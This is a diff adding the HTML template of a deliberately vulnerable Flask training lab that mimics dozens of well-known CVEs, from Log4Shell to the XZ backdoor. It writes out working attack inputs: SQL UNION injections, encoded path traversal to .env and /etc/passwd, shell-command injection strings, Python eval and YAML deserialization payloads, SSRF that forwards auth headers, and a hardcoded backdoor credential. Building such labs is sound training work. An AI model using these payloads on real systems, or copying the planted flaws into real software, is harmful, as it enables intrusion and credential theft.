@@ -1,0 +1,881 @@
+{% extends 'base.html' %}
+{% block title %}CVE Lab{% endblock %}
+{% block content %}
+<div class="pagehead">
+  <h1>CVE Analog Lab</h1>
+  <p>Flask/Python reproductions of well-known CVE vulnerability patterns for hands-on training. Each reproduces the same underlying bug class as the real CVE — not the original product's code.</p>
+</div>
+
+<div class="grid grid-2">
+  <div class="panel">
+    <h2><span>CVE-2021-44228</span> — Log4Shell</h2>
+    <p class="mono-dim">Lookup/expression injection in a log formatter. Send <code>${eval:...}</code> or <code>${lookup:...}</code> in a log message — the server evaluates it server-side.</p>
+    <a href="{{ url_for('log_console') }}" class="btn small">Open Lab →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2022-22965</span> — Spring4Shell</h2>
+    <p class="mono-dim">Dotted-path data binding lets you walk Python's object graph and write arbitrary attributes on objects far outside the intended settings scope.</p>
+    <a href="{{ url_for('settings_binder') }}" class="btn small">Open Lab →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2017-5638</span> — Struts S2-045</h2>
+    <p class="mono-dim">Upload classification endpoint evaluates a malformed Content-Type header as a Python expression (pre-auth, no file needed). Send a non-MIME Content-Type.</p>
+    <a href="#" onclick="testStruts()" class="btn small">Test via API →</a>
+    <pre class="code" id="struts-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2021-41773</span> — Apache Path Traversal</h2>
+    <p class="mono-dim">Traversal check looks for literal <code>..</code> but path is decoded AFTER the check. Try <code>/media2/view?path=../.env</code> (blocked) vs <code>/media2/view?path=%2e%2e%2F.env</code> (bypasses).</p>
+    <a href="/media2/view?path=notes.txt" class="btn small">Normal file →</a>
+    <a href="/media2/view?path=%2e%2e%2F.env" class="btn small secondary" style="margin-left:8px;" target="_blank">Traversal bypass →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-34362</span> — MOVEit SQLi</h2>
+    <p class="mono-dim">Unauthenticated folder-listing API builds SQL from a query param. Try <code>/api/transfer/folder?folder=' UNION SELECT username,password_hash,role FROM users--</code>.</p>
+    <a href="/api/transfer/folder?folder=Bay+A" class="btn small" target="_blank">API →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-4966</span> — Citrix Bleed</h2>
+    <p class="mono-dim">Over-read of a shared "buffer" returns data from the previous session token issuance. Try <code>/ground-relay/session-check?expected_len=200</code> after another session.</p>
+    <a href="/ground-relay/session-check?expected_len=5" class="btn small" target="_blank">Probe →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-22515</span> — Confluence Setup Bypass</h2>
+    <p class="mono-dim">First-run admin-creation setup endpoint still reachable on a fully configured, live deployment — no authentication required at all.</p>
+    <a href="{{ url_for('setup_create_admin') }}" class="btn small" target="_blank">Open Setup →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2024-3400</span> — PAN-OS GlobalProtect</h2>
+    <p class="mono-dim">Attacker-supplied session ID used unsanitised to build a file path AND passed to a shell command — file creation plus command injection. POST to <code>/vpn/session-init</code>.</p>
+    <a href="#" onclick="testPanos()" class="btn small">Test via API →</a>
+    <pre class="code" id="panos-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-38831</span> — WinRAR Extension Spoof</h2>
+    <p class="mono-dim">Extension check inspects only the first dot-segment; the actual trailing extension that the OS honours is the last one. Upload a file named <code>firmware.txt   .py</code>.</p>
+    <a href="{{ url_for('upload') }}" class="btn small">Upload Page →</a>
+    <a href="#" onclick="testWinrar()" class="btn small secondary" style="margin-left:8px;">Test via API →</a>
+    <pre class="code" id="winrar-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2021-26855</span> — ProxyLogon Chain</h2>
+    <p class="mono-dim">SSRF + arbitrary file write chained together: fetch any URL server-side, then write the response to an attacker-chosen filename. POST to <code>/proxy/fetch-and-store</code>.</p>
+    <a href="#" onclick="testProxy()" class="btn small">Test via API →</a>
+    <pre class="code" id="proxy-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2022-1388</span> — F5 BIG-IP Header Auth Bypass</h2>
+    <p class="mono-dim">Internal auth header presence (not its value) bypasses all authentication. Try <code>curl -H "X-F5-Internal-Auth: anything" /api/icontrol/system-info</code>.</p>
+    <a href="/api/icontrol/system-info" class="btn small" target="_blank">Without header →</a>
+    <a href="#" onclick="testF5()" class="btn small secondary" style="margin-left:8px;">With header →</a>
+    <pre class="code" id="f5-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-23752</span> — Joomla! Access Control</h2>
+    <p class="mono-dim">Append <code>?list=all</code> to a public endpoint to bypass the access check and receive full internal records instead of the safe public subset.</p>
+    <a href="/api/public/station-list" class="btn small" target="_blank">Public view →</a>
+    <a href="/api/public/station-list?list=all" class="btn small secondary" style="margin-left:8px;" target="_blank">Bypassed →</a>
+  </div>
+</div>
+
+<h2 style="margin-top:28px;">Batch 2 — Classic &amp; Network-Layer CVE Analogs</h2>
+<div class="grid grid-2">
+  <div class="panel">
+    <h2><span>CVE-2014-0160</span> — Heartbleed</h2>
+    <p class="mono-dim">Declare a larger <code>payload_length</code> than the body you send — the server over-reads from a shared buffer and returns previous requests' data. POST to <code>/health/ping?payload_length=200</code>.</p>
+    <a href="#" onclick="testHeartbleed()" class="btn small">Test →</a>
+    <pre class="code" id="hb-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2014-6271</span> — Shellshock</h2>
+    <p class="mono-dim">If the env value starts with the bash function prologue <code>() {</code>, the remainder is evaluated as Python code. No authentication required.</p>
+    <a href="{{ url_for('env_check') }}" class="btn small">Open Lab →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2017-9841</span> — PHPUnit eval-stdin</h2>
+    <p class="mono-dim">The "unit test runner" endpoint directly executes the raw HTTP request body as Python code. Zero authentication, zero validation.</p>
+    <a href="#" onclick="testPhpunit()" class="btn small">Execute code →</a>
+    <pre class="code" id="phpunit-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>Git config exposure</span></h2>
+    <p class="mono-dim">.git/config exposed directly — leaks a hardcoded deploy token in the remote origin URL, branch names, and committer identity.</p>
+    <a href="/.git/config" class="btn small" target="_blank">View .git/config →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>GraphQL Batching Abuse</span></h2>
+    <p class="mono-dim">Array of operations processed as a single HTTP request — per-operation rate limiting absent. POST an array to <code>/api/graphql/batch</code> to enumerate hundreds of users in one request.</p>
+    <a href="#" onclick="testGraphqlBatch()" class="btn small">Batch enum →</a>
+    <pre class="code" id="gql-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2014-3566</span> — POODLE / TLS Downgrade</h2>
+    <p class="mono-dim">Server accepts any declared TLS version including SSLv3, with no minimum version enforcement. Try <code>/tls/protocol-check?tls_version=SSLv3</code>.</p>
+    <a href="/tls/protocol-check?tls_version=TLSv1.3" class="btn small" target="_blank">Normal →</a>
+    <a href="/tls/protocol-check?tls_version=SSLv3" class="btn small secondary" style="margin-left:8px;" target="_blank">Downgraded →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>DNS Rebinding</span></h2>
+    <p class="mono-dim">Internal relay status endpoint never validates the Host header — any Host value, including one arriving via DNS rebinding, reaches internal station data.</p>
+    <a href="#" onclick="testDnsRebind()" class="btn small">Test with spoofed host →</a>
+    <pre class="code" id="dns-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2021-22205</span> — GitLab Path Traversal</h2>
+    <p class="mono-dim">File browser path not contained after normalization. Try <code>/files/browse?path=../../.env</code> or <code>../../app.py</code>.</p>
+    <a href="/files/browse?path=2024-05-01.log" class="btn small" target="_blank">Normal file →</a>
+    <a href="/files/browse?path=../../.env" class="btn small secondary" style="margin-left:8px;" target="_blank">Traversal →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2017-0144</span> — EternalBlue session substitution</h2>
+    <p class="mono-dim">POST a session_id mismatch: the server uses the <em>target</em> session's credentials instead of yours — wrong-context substitution. Set target_session=0 to borrow the admin context.</p>
+    <a href="#" onclick="testEternalBlue()" class="btn small">Test substitution →</a>
+    <pre class="code" id="eb-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2014-0224</span> — OpenSSL CCS Injection</h2>
+    <p class="mono-dim">Server accepts ChangeCipherSpec at any handshake phase, not just the correct one. Add <code>?handshake_phase=ccs&amp;inject_key=attacker</code>.</p>
+    <a href="/tls/change-cipher-spec?handshake_phase=finished" class="btn small" target="_blank">Normal →</a>
+    <a href="/tls/change-cipher-spec?handshake_phase=ccs&inject_key=attacker" class="btn small secondary" style="margin-left:8px;" target="_blank">CCS injected →</a>
+  </div>
+</div>
+
+<h2 style="margin-top:28px;">Batch 3 — 2022-2024 Critical CVE Analogs</h2>
+<div class="grid grid-2">
+  <div class="panel">
+    <h2><span>CVE-2023-35078</span> — Ivanti MobileIron Auth Bypass</h2>
+    <p class="mono-dim">API path prefix excluded from authentication entirely. Any request to this path bypasses auth and returns internal data with no credentials.</p>
+    <a href="/api/cve-batch3/ivanti-bypass" class="btn small" target="_blank">No-auth bypass →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-2868</span> — Barracuda ESG File Write + RCE</h2>
+    <p class="mono-dim">Filename used in both a file-write operation and a shell command without sanitization — plant a file and inject shell metacharacters in one POST.</p>
+    <a href="#" onclick="testBarracuda()" class="btn small">Test →</a>
+    <pre class="code" id="barracuda-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-35036</span> — MOVEit Auth Bypass (session issue)</h2>
+    <p class="mono-dim">POST a user_id — the endpoint issues a full session token for that user with zero credential check. Sets a session cookie too.</p>
+    <a href="#" onclick="testMoveit()" class="btn small">Get session →</a>
+    <pre class="code" id="moveit-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-3519</span> — Citrix ADC/NetScaler RCE</h2>
+    <p class="mono-dim">OpenID discovery endpoint evals a crafted redirect_uri for "validation" with no authentication. Try injecting a Python expression.</p>
+    <a href="/citrix/oauth/idp/.well-known/openid-configuration?redirect_uri=https://example.com" class="btn small" target="_blank">Normal →</a>
+    <a href="/citrix/oauth/idp/.well-known/openid-configuration?redirect_uri='+str(__import__('os').getcwd())+'x" class="btn small secondary" style="margin-left:8px;" target="_blank">Injected →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2024-28255</span> — OpenMetadata Expression Injection</h2>
+    <p class="mono-dim">Metadata filter expressions are eval'd directly. POST <code>{"filter": "__import__('os').getcwd()"}</code> to the query endpoint.</p>
+    <a href="#" onclick="testOpenMeta()" class="btn small">Test →</a>
+    <pre class="code" id="openmeta-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2024-1709</span> — ScreenConnect Setup Auth Bypass</h2>
+    <p class="mono-dim">Setup wizard still reachable on a live system — create a new admin account with zero authentication or verification that setup completed.</p>
+    <a href="#" onclick="testScreenConnect()" class="btn small">Create admin →</a>
+    <pre class="code" id="sc-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-42793</span> — TeamCity Token Creation</h2>
+    <p class="mono-dim">Unauthenticated REST endpoint creates admin tokens — initial-setup endpoint never removed from production builds.</p>
+    <a href="/api/teamcity/setup" class="btn small" target="_blank">Create token (GET) →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2021-21985</span> — VMware vRealize SSRF</h2>
+    <p class="mono-dim">Analytics collector endpoint makes server-side requests to any attacker-supplied URL with no auth or URL validation. Try internal addresses.</p>
+    <a href="#" onclick="testVrealize()" class="btn small">Test SSRF →</a>
+    <pre class="code" id="vr-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2024-23897</span> — Jenkins Arbitrary File Read</h2>
+    <p class="mono-dim">Workspace path prefixed with <code>@</code> is expanded to read arbitrary files from disk — the args4j @-file expansion bug. Try <code>/jenkins/workspace/@/etc/passwd</code>.</p>
+    <a href="/jenkins/workspace/normal-job" class="btn small" target="_blank">Normal →</a>
+    <a href="/jenkins/workspace/@/home/claude/lawcypenlab/.env" class="btn small secondary" style="margin-left:8px;" target="_blank">File read →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2022-36804</span> — Bitbucket Argument Injection</h2>
+    <p class="mono-dim">Branch name injected directly into a shell command. POST <code>branch=main; id</code> to inject OS commands via git mirror operation.</p>
+    <a href="#" onclick="testBitbucket()" class="btn small">Test injection →</a>
+    <pre class="code" id="bb-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+</div>
+
+<script>
+async function testBarracuda() {
+  const body = new URLSearchParams({filename:'shell.py; echo INJECTED', content:'VALIDATION_RESULT="barracuda_rce"'});
+  const r = await fetch('/cgi-bin/submit.cgi', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('barracuda-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testMoveit() {
+  const body = new URLSearchParams({user_id:'1'});
+  const r = await fetch('/human.aspx', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('moveit-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testOpenMeta() {
+  const r = await fetch('/api/openmetadata/query', {method:'POST', body:JSON.stringify({filter:"__import__('os').getcwd()"}), headers:{'Content-Type':'application/json'}});
+  const d = await r.json();
+  const el = document.getElementById('openmeta-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testScreenConnect() {
+  const body = new URLSearchParams({admin_username:`sc_admin_${Date.now()}`, admin_password:'test123'});
+  const r = await fetch('/api/screenconnect/setup', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('sc-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testVrealize() {
+  const r = await fetch('/api/vrealize/analytics?collector_url=https://httpbin.org/get');
+  const d = await r.json();
+  const el = document.getElementById('vr-result');
+  el.style.display='block'; el.textContent=JSON.stringify({status:d.status, cve:d.cve},null,2);
+}
+async function testBitbucket() {
+  const body = new URLSearchParams({repo:'station-software', branch:'main; echo BB_INJECTED'});
+  const r = await fetch('/api/bitbucket/mirror/repo', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('bb-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+</script>
+
+<h2 style="margin-top:28px;">Batch 4 — Supply Chain, Auth Bypass &amp; Protocol CVEs</h2>
+<div class="grid grid-2">
+  <div class="panel">
+    <h2><span>CVE-2024-3094</span> — XZ Utils Backdoor</h2>
+    <p class="mono-dim">Supply-chain backdoor: a magic string in the SSH public key field bypasses authentication entirely and grants access as admin, regardless of actual credentials.</p>
+    <a href="#" onclick="testXZ()" class="btn small">Test backdoor →</a>
+    <pre class="code" id="xz-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>SAML Wrapping</span> — SolarWinds Orion analog</h2>
+    <p class="mono-dim">SAML outer signature validated but Assertion content never verified — replace the Assertion with attacker-controlled attributes and get any role.</p>
+    <a href="#" onclick="testSAML()" class="btn small">Forge assertion →</a>
+    <pre class="code" id="saml-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-46604</span> — Apache ActiveMQ Deserialization</h2>
+    <p class="mono-dim">Unauthenticated message broker endpoint deserializes a base64 pickle payload. Same class as the Backup/Restore bug, but pre-auth and in a different context.</p>
+    <a href="#" onclick="testActiveMQ()" class="btn small">Test →</a>
+    <pre class="code" id="amq-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-20198</span> — Cisco IOS XE Privilege Escalation</h2>
+    <p class="mono-dim">A single unauthenticated GET to this URL creates a new privilege-level-15 (admin) account. No body, no credentials, no confirmation.</p>
+    <a href="/webui/logoutconfirm.html" class="btn small" target="_blank">Create admin (GET) →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2022-40684</span> — Fortinet FortiOS Path Traversal</h2>
+    <p class="mono-dim">Unauthenticated API config endpoint with path traversal via the <code>config</code> parameter. Try <code>?config=../../.env</code>.</p>
+    <a href="/api/fortios/config?config=2024-05-01.log" class="btn small" target="_blank">Normal →</a>
+    <a href="/api/fortios/config?config=../../.env" class="btn small secondary" style="margin-left:8px;" target="_blank">Traversal →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-26360</span> — Adobe ColdFusion Deserialization</h2>
+    <p class="mono-dim">Pre-auth YAML deserialization on the ColdFusion AMF endpoint. POST <code>!!python/object/apply:os.getcwd []</code> to get RCE.</p>
+    <a href="/cfide/main/ide.cfm" class="btn small" target="_blank">Probe →</a>
+    <a href="#" onclick="testCF()" class="btn small secondary" style="margin-left:8px;">Test RCE →</a>
+    <pre class="code" id="cf-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-43770</span> — Roundcube Persistent XSS</h2>
+    <p class="mono-dim">Webmail renders message bodies with <code>|safe</code> — compose a message with a script tag and it fires for every recipient who opens their inbox.</p>
+    <a href="{{ url_for('roundcube_xss') }}" class="btn small">Open Webmail →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2018-7600</span> — Drupalgeddon 2 RCE</h2>
+    <p class="mono-dim">Form API meta-key <code>#post_render_callback</code> is evaluated as Python — attacker-controlled expression in a registration form field triggers RCE.</p>
+    <a href="{{ url_for('drupal_rce') }}" class="btn small">Open Lab →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2020-1472</span> — ZeroLogon</h2>
+    <p class="mono-dim">All-zero challenge response accepted due to AES-CFB8 statistical bias — resets the admin password to empty with no real key knowledge.</p>
+    <a href="#" onclick="testZeroLogon()" class="btn small">Test bypass →</a>
+    <pre class="code" id="zl-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2021-22005</span> — VMware ESXi Management API</h2>
+    <p class="mono-dim">Unauthenticated hypervisor API with a hidden <code>?exec=</code> parameter for direct OS command execution. Try <code>/api/esxi/vm-list?exec=id</code>.</p>
+    <a href="/api/esxi/vm-list" class="btn small" target="_blank">VM list →</a>
+    <a href="/api/esxi/vm-list?exec=id" class="btn small secondary" style="margin-left:8px;" target="_blank">RCE →</a>
+  </div>
+</div>
+
+<h2 style="margin-top:28px;">Batch 5 — Network, IoT &amp; Protocol CVEs</h2>
+<div class="grid grid-2">
+  <div class="panel">
+    <h2><span>CVE-2024-21591</span> — Juniper Junos J-Web Auth Bypass</h2>
+    <p class="mono-dim">A specific URL path on the J-Web management interface is reachable without auth and returns the root-equivalent credential hash. No credentials needed.</p>
+    <a href="/webauth_ro" class="btn small" target="_blank">Bypass →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2024-0012 / CVE-2024-9474</span> — PAN-OS Cookie/Header Injection</h2>
+    <p class="mono-dim">A <code>PHPSESSID</code> cookie or <code>X-PAN-AuthToken</code> header containing "superuser" bypasses all authentication and grants superuser role.</p>
+    <a href="#" onclick="testPANCookie()" class="btn small">Bypass via cookie →</a>
+    <pre class="code" id="pan-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2024-28987</span> — SolarWinds Web Help Desk Credential Exposure</h2>
+    <p class="mono-dim">Unauthenticated connection-test endpoint returns all DB credentials, the app secret key, JWT secret, and admin override code in plaintext.</p>
+    <a href="/helpdesk/api/connection-test" class="btn small" target="_blank">Dump credentials →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2019-18935 / CVE-2024-6327</span> — Telerik UI Deserialization</h2>
+    <p class="mono-dim">Pre-auth pickle deserialization via the Telerik RadAsyncUpload <code>raupostdata</code> field. Same class as ActiveMQ but in a UI component context.</p>
+    <a href="#" onclick="testTelerik()" class="btn small">Test →</a>
+    <pre class="code" id="telerik-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2019-10149</span> — Exim MTA Command Injection</h2>
+    <p class="mono-dim">SMTP envelope fields injected into a shell command without sanitization. POST to <code>/cgi-bin/exim.cgi</code> with <code>rcpt_to=user@host; id</code>.</p>
+    <a href="#" onclick="testExim()" class="btn small">Test injection →</a>
+    <pre class="code" id="exim-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2023-40931</span> — Nagios XI SQLi</h2>
+    <p class="mono-dim">CGI script <code>host</code> parameter injected into SQL. Try <code>/nagios/cgi-bin/statusmap.cgi?host='+UNION+SELECT+username,password_hash+FROM+users--</code>.</p>
+    <a href="/nagios/cgi-bin/statusmap.cgi?host=localhost" class="btn small" target="_blank">Normal →</a>
+    <a href="/nagios/cgi-bin/statusmap.cgi?host=%27+UNION+SELECT+username,password_hash+FROM+users--" class="btn small secondary" style="margin-left:8px;" target="_blank">SQLi →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2020-29583 / CVE-2023-28771</span> — Zyxel Backdoor + Command Injection</h2>
+    <p class="mono-dim">ZTP handler accepts a hardcoded backdoor credential ("PrOw!aN_fXp") that grants direct command execution. Both the backdoor and the injection live on the same endpoint.</p>
+    <a href="/ztp/cgi-bin/handler.cgi?credential=PrOw!aN_fXp&payload=id" class="btn small" target="_blank">Backdoor + RCE →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>D-Link CGI</span> — Command Injection</h2>
+    <p class="mono-dim">Network config form fields (<code>ssid</code>, <code>hostname</code>) passed to shell with no sanitization. POST with <code>ssid=x; id</code> to inject OS commands.</p>
+    <a href="#" onclick="testDlink()" class="btn small">Test →</a>
+    <pre class="code" id="dlink-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2024-6387</span> — OpenSSH regreSSHion</h2>
+    <p class="mono-dim">Unauthenticated version banner and LoginGraceTime config exposed — sufficient to fingerprint and confirm if target is vulnerable to the race-condition RCE.</p>
+    <a href="/api/openssh/auth-info" class="btn small" target="_blank">Fingerprint →</a>
+  </div>
+
+  <div class="panel">
+    <h2><span>CVE-2024-21413</span> — Outlook MonikerLink / SSRF</h2>
+    <p class="mono-dim">Mail preview endpoint fetches a caller-supplied URL and forwards the client's Authorization header to it — SSRF with credential theft. Try a UNC-style target.</p>
+    <a href="#" onclick="testMoniker()" class="btn small">Test SSRF + auth forward →</a>
+    <pre class="code" id="moniker-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+</div>
+
+<script>
+async function testPANCookie() {
+  const r = await fetch('/global-protect/login', {method:'POST', headers:{'Cookie':'PHPSESSID=superuser_bypass'}, body:new URLSearchParams({username:'',password:''})});
+  const d = await r.json();
+  const el = document.getElementById('pan-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testTelerik() {
+  const payload = btoa(JSON.stringify({type:'telerik_test'}));
+  const body = new URLSearchParams({raupostdata: payload});
+  const r = await fetch('/telerik/filemanager/upload', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('telerik-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testExim() {
+  const body = new URLSearchParams({sender:'admin@station.ops', rcpt_to:'user@host; echo EXIM_INJECTED'});
+  const r = await fetch('/cgi-bin/exim.cgi', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('exim-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testDlink() {
+  const body = new URLSearchParams({ssid:'MySSID; echo DLINK_INJECTED', hostname:'router.local'});
+  const r = await fetch('/dlink/cgi-bin/form-POST', {method:'POST', body});
+  const d = await r.json();
+  const el = document.getElementById('dlink-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testMoniker() {
+  const r = await fetch('/exchange/mapi/nspi?preview_url=https://httpbin.org/headers', {headers:{'Authorization':'NTLM TlRMTVNTUA...'}});
+  const d = await r.json();
+  const el = document.getElementById('moniker-result');
+  el.style.display='block'; el.textContent=JSON.stringify({status:d.status,forwarded_auth:d.forwarded_auth,cve:d.cve},null,2);
+}
+
+// Batch 5+
+async function testPANCookie() {
+  const r = await fetch('/global-protect/login', {method:'POST', headers:{'Cookie':'PHPSESSID=superuser_bypass'}, body:new URLSearchParams({username:'',password:''})});
+  const d = await r.json(); const el=document.getElementById('pan-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testTelerik() {
+  const payload=btoa(JSON.stringify({adhoc:'test'}));
+  const r=await fetch('/telerik/filemanager/upload',{method:'POST',body:new URLSearchParams({raupostdata:payload})});
+  const d=await r.json(); const el=document.getElementById('telerik-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testExim() {
+  const r=await fetch('/cgi-bin/exim.cgi',{method:'POST',body:new URLSearchParams({sender:'a@b.com',rcpt_to:'user@host; echo EXIM_INJECTED'})});
+  const d=await r.json(); const el=document.getElementById('exim-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+async function testDlink() {
+  const r=await fetch('/dlink/cgi-bin/form-POST',{method:'POST',body:new URLSearchParams({ssid:'x; echo DLINK_INJECTED',hostname:'router'})});
+  const d=await r.json(); const el=document.getElementById('dlink-result');
+  el.style.display='block'; el.textContent=JSON.stringify(d,null,2);
+}
+</script>
+
+<h2 style="margin-top:28px;">Batch 7 — Atlassian, Oracle, IoT &amp; Container CVEs</h2>
+<div class="grid grid-2">
+  <div class="panel">
+    <h2><span>CVE-2022-26134</span> — Jira/Confluence OGNL Injection</h2>
+    <p class="mono-dim">Template search field evaluates OGNL-style <code>${expr}</code> as Python code server-side. Try <code>?searchText=${7*7}</code>.</p>
+    <a href="/jira/secure/QueryComponent!Default.jspa?searchText=%24%7B7*7%7D" class="btn small" target="_blank">Test (${7*7}) →</a>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2019-2725</span> — Oracle WebLogic Deserialization</h2>
+    <p class="mono-dim">Pre-auth pickle deserialization on the wls-wsat SOAP endpoint — same class as ActiveMQ and Telerik, different product framing.</p>
+    <a href="#" onclick="testWebLogic()" class="btn small">Test →</a>
+    <pre class="code" id="wl-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2021-39237</span> — HP/Lexmark Printer RCE</h2>
+    <p class="mono-dim">Unauthenticated device-info endpoint exposes hardcoded admin password, then <code>?action=</code> executes OS commands.</p>
+    <a href="/hp/device/info.xml?action=id" class="btn small" target="_blank">RCE →</a>
+  </div>
+  <div class="panel">
+    <h2><span>Kubernetes RBAC Bypass</span></h2>
+    <p class="mono-dim">Any valid bearer token (even a low-privilege service account) lists pods in any namespace — wildcard verb permission never scoped.</p>
+    <a href="#" onclick="testK8s()" class="btn small">List kube-system pods →</a>
+    <pre class="code" id="k8s-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2022-24758</span> — Jupyter Notebook Unauth Exec</h2>
+    <p class="mono-dim">POST a notebook JSON to the nbconvert endpoint — all code cells are executed server-side with zero authentication.</p>
+    <a href="#" onclick="testJupyter()" class="btn small">Execute code →</a>
+    <pre class="code" id="jup-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2019-5420</span> — Rails Cookie Deserialization</h2>
+    <p class="mono-dim">Session cookie decoded as pickle — forge a <code>_session_id</code> cookie containing a malicious pickle payload to get RCE.</p>
+    <a href="/rails/session-test" class="btn small" target="_blank">Get sample cookie →</a>
+    <a href="#" onclick="testRails()" class="btn small secondary" style="margin-left:8px;">Deserialize →</a>
+    <pre class="code" id="rails-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2019-0193</span> — Apache Solr DataImportHandler</h2>
+    <p class="mono-dim">Query parameter prefixed with <code>$eval:</code> is evaluated as Python. Try <code>/solr/select?q=$eval:__import__('os').getcwd()</code>.</p>
+    <a href="/solr/select?q=$eval:7*7" class="btn small" target="_blank">Test eval →</a>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2020-5741</span> — Plex Media Server RCE</h2>
+    <p class="mono-dim">mediaPath prefixed with <code>python://</code> is evaluated as code — any authenticated Plex user gets RCE via a crafted transcode request.</p>
+    <a href="/plex/:/transcode/universal/decision?X-Plex-Token=any&mediaPath=python://7*7" class="btn small" target="_blank">Test →</a>
+  </div>
+  <div class="panel">
+    <h2><span>CVE-2022-22954</span> — VMware Workspace ONE SSTI</h2>
+    <p class="mono-dim">Device friendly name field evaluates <code>${expr}</code> / <code>{{expr}}</code> as Python. POST JSON to the enrollment API.</p>
+    <a href="#" onclick="testWSOFull()" class="btn small">Test →</a>
+    <pre class="code" id="wso2-result" style="margin-top:10px;display:none;"></pre>
+  </div>
+  <div class="panel">
+    <h2><span>Container Escape via Volume Mount</span></h2>
+    <p class="mono-dim">Docker API accepts a privileged volume mount spec and writes to the host path directly — crossing the container boundary.</p>
+    <a href="#" onclick="testDockerEscape()" class="btn small">Test escape →</a>
